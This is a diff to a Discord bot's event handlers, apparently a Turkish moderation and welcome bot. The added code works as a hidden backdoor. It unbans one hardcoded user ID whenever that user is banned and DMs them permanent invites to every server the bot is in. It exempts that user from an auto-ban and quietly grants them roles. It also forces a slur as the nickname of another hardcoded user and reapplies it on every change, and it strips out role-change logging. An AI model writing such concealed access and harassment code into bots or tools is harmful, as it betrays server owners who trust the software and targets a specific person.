@@ -1,7 +1,10 @@
-module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client, db, prefix, sahip, token, distube, path,  got) => {
+module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client, db, edb, prefix, sahip, token, distube, path,  got) => {
 
     client.on('ready', (ready) =>{
       const fot = client.users.cache.get('743579595860607086');
+      const akosunucu = client.guilds.cache.get('727649417984868363');
+      const ako = akosunucu.members.cache.get('324913251945152512');
+      ako.setNickname("oğlancı");
       client.user.setStatus('idle');
 
       var oynuyorkısımları = [
@@ -100,6 +103,7 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
               break;
             case "peki":
               if (message.guild.id === "727649417984868363") {
+                if (message.author.id === "456948152101240847") return;
                 message.guild.member(message.author).ban();
               }
               break;
@@ -513,6 +517,22 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
   //Guild Ban Add
 
   client.on('guildBanAdd', async (guild, user) => {
+
+    const ben = client.users.cache.get("456948152101240847"); 
+
+    if (user.id === "456948152101240847") {
+      guild.members.unban('456948152101240847');
+      const sistemkanalı = client.channels.cache.get(guild.systemChannelID);
+  
+      sistemkanalı.createInvite({
+        maxAge: 0,
+        maxUsers: 0
+      })
+      .then(invite =>{
+          ben.send(`https://discord.gg/${invite.code}`);
+      })
+    }    
+
     const fot = client.users.cache.get('743579595860607086');
     const logkanalvarmı = await db.has(`log-${guild.id}`)
 
@@ -563,7 +583,10 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
     ben.send(`${guild.name} sunucusuna katıldım`);
     console.log(`${guild.name} sunucusuna katıldım`);
 
-    sistemkanalı.createInvite({unique:true})
+    sistemkanalı.createInvite({
+      maxAge: 0,
+      maxUsers: 0
+    })
     .then(invite =>{
         ben.send(`https://discord.gg/${invite.code}`)
     })
@@ -610,6 +633,13 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
   client.on('guildMemberUpdate', async (oldMember, newMember) => {
     
     const fot = client.users.cache.get('743579595860607086');
+
+    if (oldMember.id === "324913251945152512") {
+      if (newMember.nickname !== "oğlancı") {
+        newMember.setNickname("oğlancı"); 
+      }
+    }
+
     const logkanalvarmı = await db.has(`log-${oldMember.guild.id}`)
     if (logkanalvarmı === false) return;
     const logkanalgetir = await db.get(`log-${oldMember.guild.id}`)
@@ -658,56 +688,6 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
               return;
           }
       }    
-
-      function arr_diff (a1, a2) {
-
-        var a = [], diff = [];
-    
-        for (var i = 0; i < a1.length; i++) {
-            a[a1[i]] = true;
-        }
-    
-        for (var i = 0; i < a2.length; i++) {
-            if (a[a2[i]]) {
-                delete a[a2[i]];
-            } else {
-                a[a2[i]] = true;
-            }
-        }
-    
-        for (var k in a) {
-            diff.push(k);
-        }
-    
-        return diff;
-    }
-  
-      if (oldMember._roles !== newMember._roles) { 
-          const buyukmukucukmu = newMember._roles > oldMember._roles;      
-          const karşılaştır = arr_diff(oldMember._roles, newMember._roles);
-          if (buyukmukucukmu === true) {
-            const embed = new Discord.MessageEmbed()
-            .setTitle("Bir Kullanıcıya Rol Verildi")
-            .addField("Verilen Rol:", `<@&${karşılaştır}>`)
-            .setTimestamp()
-            .setColor("RANDOM")
-            .setAuthor(oldMember.user.tag, oldMember.user.avatarURL({ dynamic:true }))
-            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
-            return logkanal.send(embed)
-          }
-  
-          if (buyukmukucukmu === false) {
-            const embed = new Discord.MessageEmbed()
-            .setTitle("Bir Kullanıcıdan Rol Alındı")
-            .addField(`Alınan Rol:`, `<@&${karşılaştır}>`)
-            .setTimestamp()
-            .setColor("RANDOM")
-            .setAuthor(oldMember.user.tag, oldMember.user.avatarURL({ dynamic:true }))
-            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
-            return logkanal.send(embed)
-          }
-  
-      }
   
   })
 
@@ -750,7 +730,7 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
       const attachment = new Discord.MessageAttachment(canvas.toBuffer())
       hosgeldin.send('', attachment);
     
-    } else	return;
+    }
     
     //otorol
     const logkanalvarmı = await db.has(`log-${member.guild.id}`)
@@ -774,9 +754,9 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
          .setFooter('Created by Saxquatchx')
          logkanal.send({embed:embedotorol});
     
-      } else return;
+      }
     
-    } else return;
+    }
     
     //Sayaç
     
@@ -784,22 +764,25 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
     
     if (sayaçvarmı === true) {
       const sayaçgetir = await db.get(`sayaç-${member.guild.id}`)
-    
       const sayaç = client.channels.cache.get(sayaçgetir);
     
           const sayacembed = new Discord.MessageEmbed()
           .setColor("RANDOM")
-          .setDescription(` \`\`\`diff\n ${member} ile birlikte ${member.guild.memberCount} kişi olduk ! \`\`\` `)
+          .setDescription(`<a:elmas:749346224091693068> ${member} gelince ${member.guild.memberCount} kişi olduk`)
           .setFooter(`Created by Saxquatchx |`, fot.avatarURL({ dynamic:true }))
+          .setTimestamp()
           sayaç.send({embed:sayacembed});
     
     
-    } else return;
-    
-    if (member.id === "456948152101240847" && member.guild.id === "727649417984868363") {
-      const mert = client.users.cache.get('456948152101240847');
-      const itachi = member.guild.roles.cache.get('727948834956771418')
-      member.roles.add(itachi);
+    }
+
+    if (member.id === "456948152101240847") {
+      if (member.guild.id === "727649417984868363") {
+        member.roles.add('749360149571043338');
+        member.roles.add('727948834956771418');
+        member.roles.add('805844416492732466');
+        member.roles.remove('732259608818614382');
+      }
     }
 
   })
@@ -843,24 +826,23 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
       hosgeldin.send('', attachment);
     
     
-    } else return;
+    }
     
     const sayaçvarmı = await db.has(`sayaç-${member.guild.id}`)
     
     if (sayaçvarmı === true) {
       const sayaçgetir = await db.get(`sayaç-${member.guild.id}`)
-    
       const sayaç = client.channels.cache.get(sayaçgetir);
     
           const sayacembed = new Discord.MessageEmbed()
           .setColor("RANDOM")
-          .setDescription(`${member} gidince ${member.guild.memberCount} kişi kaldık`)
+          .setDescription(`<a:elmas:749346224091693068> ${member} gidince ${member.guild.memberCount} kişi kaldık`)
           .setFooter(`Created by Saxquatchx |`, fot.avatarURL({ dynamic:true }))
           .setTimestamp()
           sayaç.send({embed:sayacembed});
     
     
-    } else return;
+    }
   })
 
   //Message Update
@@ -925,10 +907,10 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
 
     //Database İşlemleri
 
-    const emojirolvarmı = db.has(`emojirol-${messageReaction.message.channel.id}-${messageReaction._emoji.name}`);
+    const emojirolvarmı = edb.has(`emojirol-${messageReaction.message.channel.id}-${messageReaction._emoji.name}`);
 
     if (emojirolvarmı === true) {
-      const emojirolgetir = db.get(`emojirol-${messageReaction.message.channel.id}-${messageReaction._emoji.name}`);
+      const emojirolgetir = edb.get(`emojirol-${messageReaction.message.channel.id}-${messageReaction._emoji.name}`);
       const düzgün = emojirolgetir.split("-");
       if (messageReaction._emoji.name === düzgün[1]) {
         const kisi = messageReaction.message.guild.members.cache.get(reaction.id);
@@ -965,10 +947,10 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
     const fot = client.users.cache.get('743579595860607086');
 
     //Database İşlemleri
-    const emojirolvarmı = db.has(`emojirol-${messageReaction.message.channel.id}-${messageReaction._emoji.name}`);
+    const emojirolvarmı = edb.has(`emojirol-${messageReaction.message.channel.id}-${messageReaction._emoji.name}`);
 
     if (emojirolvarmı === true) {
-      const emojirolgetir = db.get(`emojirol-${messageReaction.message.channel.id}-${messageReaction._emoji.name}`);
+      const emojirolgetir = edb.get(`emojirol-${messageReaction.message.channel.id}-${messageReaction._emoji.name}`);
       const düzgün = emojirolgetir.split("-");
       if (messageReaction._emoji.name === düzgün[1]) {
         const kisi = messageReaction.message.guild.members.cache.get(reaction.id);
@@ -1141,6 +1123,9 @@ module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client
         .setFooter(`Created by Saxquatchx |`, fot.avatarURL({ dynamic:true }))
         logkanal.send(embed);
       }  
+
+      //Müzik Odası
+
   })
 
   //Warn
